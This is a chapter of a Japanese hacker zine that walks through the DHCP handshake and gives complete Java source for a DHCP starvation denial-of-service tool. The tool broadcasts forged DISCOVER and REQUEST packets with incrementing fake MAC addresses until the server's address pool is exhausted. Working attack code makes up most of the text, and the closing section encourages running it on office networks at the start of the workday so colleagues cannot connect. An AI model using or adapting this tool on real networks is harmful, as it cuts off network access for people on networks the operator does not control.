x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第10章: DHCPDoS ---

著者：山本洋介山

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) はじめに

　DHCPサーバが持っているアドレスを全部借り上げてしまえば、自分がIPアドレ
スを独占できる、というか他人がLANに入れない、といったちょっとした優越感を
味わうことができるいわゆるDHCPDoSになるのではないかということを会社で仕事
もせずにぼんやりしていると思い浮かんできました。
　早速RFCも読まずに適当に作ってみたところ、手元にあるいくつかのDHCPサーバ
では動作して、つかの間の充足感を得られましたので、その仕組みとやり方を足
早に書いてみようと思います。すでに誰かやっているような気がしますがそんな
ことは知りません。


■0x02.) DHCPプロトコル

　DHCPというのは皆さんが使っているにも関らず、あまりそのことを考えたこと
もないと思いますが、LANにつないだときにIPアドレスやらサブネットマスクやら
DNSサーバのアドレスやらを自動的に渡してくれるプロトコルです。ADSLやFTTHな
んかでインターネットに接続している人がハブにLANケーブルをぶっ挿せば（現在
は無線ということもあるとは思いますが）、自動的にインターネットにつながっ
てグヘヘというのはこのDHCPのおかげなので少しは感謝してみるのもいいと思い
ます。

　さて、このDHCPプロトコルなのですが、DHCPはクライアントはポート68、サー
バはポート67を使うUDPアプリだということは知らない人も多いと思います。そし
て、やり取りは基本的に次のような流れになります。

1.自分のマシンから0.0.0.0に向けて誰かアドレスをくれる人はいませんか、と聞
いてみる（DHCPDISCOVER）

2.DHCPサーバが提供できるアドレスを持っていたならば「192.168.0.11ならある
けどうよ」といってみる（DHCPOFFER）

3.自分のマシンが「おう、それなら192.168.0.11を使ってやるよ」とお返事（DH
CPREQUEST）

4.DHCPサーバが「そんじゃ貸してやらなくもない」と承認する


■0x03.) DHCPDoSの作成

　DHCPのことがちょっとわかったところで、DHCPDoSの作成に取り掛かっていこう
かと思います。DoSはDHCPサーバからプールしているサーバからアドレスを全部頂
いてしまえばいいので、存在しない偽のMACアドレスをDHCPサーバに送りつけて、
偽MACアドレス＝LANのIPアドレスという対応でDHCPサーバのテーブルを埋め尽く
してしまえばいいということになります。

　早速プログラムを作っていくことにします。先ほどもちょっと触れましたが、
DHCPクライアントUDPアプリケーションなので、普通にsocketを使って作成するこ
とができます。そんなわけで今回は普通にsocketを使ったUDPアプリケーションの
プログラムを作ることになります。コンセプトは、たぶんDHCPのメッセージの中
にリクエストしたいIPアドレスとMACアドレス（通常自分のアドレス）が埋め込ま
れているので、そこを書き換えようということです。

　送るDHCPのメッセージをつらつらと書こうと思ったのですが、説明は面倒なの
でEtherealなんかパケットでもキャプチャしてDHCPの部分だけを切り出していた
だければと思います。たぶん43バイト目から「01 01 06 00～」となっているので
その後ろをコピーすればいいと思います。そして「C0 A8 00」みたいなところが
IPアドレスですので、その辺りに目星をつけて書き換えましょう。MACアドレスは
そのまま見えると思いますので、そこも書き換えましょう。

　次にDHCPのやり取りですが、面倒なので相手の戻りパケットはいさぎよく見な
いことにして、相手から戻りがあったことを前提に次のようにします。

1.DHCPDISCOVERの発行
2.ちょっと待つ
3.DHCPREQUESTの発行

　しかし普通にDHCPDISCOVERとすると、DHCPサーバはプールしているIPアドレス
の中から勝手にアドレスを「これでどうや」と渡してくるのですが、相手のパケ
ットを見ないという仕様なのでこれではどのIPアドレスが提供されるかわかりま
せん。
　それでは困ったのでDHCPDISCOVERするときにで自分の方から「このIPアドレス
がほしー」と主張してみることにします。具体的にはOption 50にリクエストした
いIPアドレスを埋め込めばいいと思います。すると、DHCPサーバがそのアドレス
をプールしていれば主張したアドレスを渡してくれますので、そのアドレスを渡
してくれるのを期待して、言ったとおりのIPアドレスを渡されたものとして処理
します。
　それをバイトデータに直して、UDPのデータとして渡してやればあとはPCが何と
かしてくれるはずです。

　そして、IPアドレスの4バイト目、MACアドレスの6バイト目（これはどこでもい
いと思いますが）をインクリメントして255回繰り返すと、DHCPサーバの持ってい
るIPアドレス資源を枯渇させることができます。先に持っている人には影響はな
いと思いますが、自分の後の人はIPアドレスを取得することができなくなってし
まいます。

　なお、ここではJavaを使いましたが、特殊な処理は全くしていないので別に何
の言語を使ってもかまいません。しかも、Javaでは「0.0.0.0」というアドレスを
バインドしようとするとエラーになったので、便宜上ブロードキャストアドレス
（255.255.255.255）を使っています。一応動くのですが、相手先の送信IPアドレ
スをちゃんと見ているDHCPサーバには弾かれると思います。最善を図りたい場合
は他の言語の方がいいかもしれません。

-----  ソースコード
import java.net.*;

//DHCPDoS ver. 0.1 by Yousuke Yamamoto
//192.168.0.1～192.168.0.255までのIPアドレスをDHCPサーバから割り当ててもらいます
//運がよければ他のノードにはIPアドレスが割り当てられません。
//こけおどしですが、困る人もいると思いますので悪用しないでください。

public class DHCPDoS01 {
  public final static int PORT= 67;//DHCPserver
  public static void main(String[] args) {
    
    try{
      byte[] buf1 ={
(byte)0x01,
(byte)0x01,
(byte)0x06,
(byte)0x00,
(byte)0x2d,(byte)0xa1,(byte)0x48,(byte)0x71,
(byte)0x00,(byte)0x00,
(byte)0x00,(byte)0x00,
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//4byte
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//4byte
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//4byte
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//4byte

(byte)0x00,(byte)0x11,(byte)0x09,(byte)0x83,(byte)0x4d,(byte)0x83,//MACアドレス
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//Client Hardware Address16byte

//ServerName 64byte
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,

//BootFileName 128byte
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,

//Specific Area 64byte
(byte)0x63,(byte)0x82,
(byte)0x53,(byte)0x63,
(byte)0x35,(byte)0x01,(byte)0x01,
(byte)0x74,(byte)0x01,(byte)0x01,

(byte)0x3d,(byte)0x07,(byte)0x01,(byte)0x00,(byte)0x11,(byte)0x09,(byte)0x83,(byte)0x4d,(byte)0x83,//MACアドレス
//要求IPアドレス
(byte)0x32,(byte)0x04,(byte)0xc0,(byte)0xa8,(byte)0x00,(byte)0x00,

(byte)0x37,(byte)0x0b,(byte)0x01,(byte)0x0f,(byte)0x03,(byte)0x06,(byte)0x2c,(byte)0x2e,
(byte)0x2f,(byte)0x1f,(byte)0x21,(byte)0xf9,(byte)0x2b,
(byte)0xff,
//パディング
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00
};

      
      byte[] buf2={
//28byte
(byte)0x01,
(byte)0x01,
(byte)0x06,
(byte)0x00,
(byte)0x2d,(byte)0xa1,(byte)0x48,(byte)0x71,
(byte)0x00,(byte)0x00,
(byte)0x00,(byte)0x00,
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//Client IP Addr
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//Your IP Addr
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//Next Server IP
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,//Relay Agent IP

//16byte
(byte)0x00,(byte)0x11,(byte)0x09,(byte)0x83,(byte)0x4d,(byte)0x83,//MAC アドレス
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,

//ServerName 64byte
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,

//BootFileName 128byte
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,

//Specific Area 64byte
(byte)0x63,(byte)0x82,(byte)0x53,(byte)0x63,

//ここからOption
(byte)0x35,(byte)0x01,(byte)0x03,//リクエストタイプ
(byte)0x3d,(byte)0x07,(byte)0x01,(byte)0x00,(byte)0x11,(byte)0x09,(byte)0x83,(byte)0x4d,(byte)0x83,//MACアドレス

(byte)0x32,(byte)0x04,(byte)0xc0,(byte)0xa8,(byte)0x00,(byte)0x00,//要求IP Addr

(byte)0x36,(byte)0x04,(byte)0xc0,(byte)0xa8,(byte)0x00,(byte)0x01,//Option 54//IP Addr
(byte)0x37,(byte)0x0b,(byte)0x01,(byte)0x0f,(byte)0x03,(byte)0x06,(byte)0x2c,(byte)0x2e,(byte)0x2f,(byte)0x1f,(byte)0x21,(byte)0xf9,(byte)0x2b,
(byte)0xff,
//パディング
(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00

};

      /** データを送信 **/
      // データグラムソケットを作成
      InetAddress addr = InetAddress.getByName("255.255.255.255");
      DatagramSocket socket = new DatagramSocket();
      for(int cnt=1 ;cnt<255;cnt++){
        buf1[33]=(byte)cnt;
        buf1[254]=(byte)cnt;
        buf1[260]=(byte)cnt;
        buf2[33]=(byte)cnt;
        buf2[251]=(byte)cnt;
        buf2[257]=(byte)cnt;
        // 送信するデータグラムパケットを作成
        DatagramPacket packet = new DatagramPacket(buf1,buf1.length,addr,PORT);
        // データ送信
        socket.send(packet);
        System.out.println("送信しました");
        Thread.sleep(2000);  //適当にウェイト
        packet = new DatagramPacket(buf2,buf2.length,addr,67);
        socket.send(packet);
        System.out.println("送信しました");
        Thread.sleep(2000);  //とりあえずウェイト
      }
    }catch(Exception e){
      e.printStackTrace();
    }
  }
}
-----


■0x04.) 終わりに

　こんな手抜きプログラムですが、朝、出勤時なんかに走らせてしまうと、オフ
ィスにアドレスが取れないクライアントが続出して困ったことになるかもしれま
せん。
　もちろん先に誰かに発行されているものを奪い取ることはできませんので、ど
うしてもそのアドレスが欲しいなら、リース期間が切れるまで待つか、1時間おき
にでも実行すればいいと思いますが、管理者にリセットされると終わりなので朝
の小さなイベントとして楽しんでいただければと思います。
